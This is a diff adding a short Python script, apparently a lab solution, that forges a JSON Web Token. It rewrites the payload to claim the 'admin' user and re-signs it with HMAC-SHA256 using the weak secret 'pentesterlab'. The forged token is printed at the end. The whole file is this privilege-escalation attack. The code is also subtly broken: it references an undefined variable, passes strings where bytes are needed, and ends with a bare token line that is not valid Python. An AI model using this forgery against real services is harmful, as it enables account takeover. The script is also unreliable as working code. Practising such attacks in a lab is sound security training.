@@ -1,0 +1,24 @@
+import hmac
+import hashlib
+import base64
+
+
+jeton = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
+hash,payload,sig = jwt.split(".")
+
+#echo -n '{"user":"admin"}' | base64
+#eyJ1c2VyIjoiYWRtaW4ifQ==
+
+
+
+def sign(chaine,cle):
+	return base64.urlsafe_b64encode(hmac.new(cle,chaine,hashlib.sha256).digest()).decode('utf8').rstrip("=")
+
+cle = "pentesterlab"	
+njeton = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ"
+
+nsig = sign(njeton,cle)
+
+print(nsig)
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.d9nOzQ6Dc-N077EOEhFVJdvA7ufgp8qb-fLLUkIyqZc
